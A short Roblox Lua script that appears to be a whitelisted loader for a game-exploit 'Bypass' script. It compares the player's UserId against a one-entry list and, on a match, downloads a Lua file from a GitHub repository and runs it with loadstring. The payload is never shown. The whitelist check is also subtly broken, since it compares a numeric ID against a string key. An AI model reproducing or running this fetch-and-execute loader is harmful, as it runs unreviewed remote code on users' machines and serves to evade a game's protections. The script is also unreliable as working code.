local validHWIDs = {
    ["9356628060"] = true
}

local player = game.Players.LocalPlayer
local hwid = player.UserId

if validHWIDs[hwid] then
  loadstring(game:HttpGet("https://raw.githubusercontent.com/devzgroupscripts/Bypass/refs/heads/main/script.lua", true))()
else
    
end
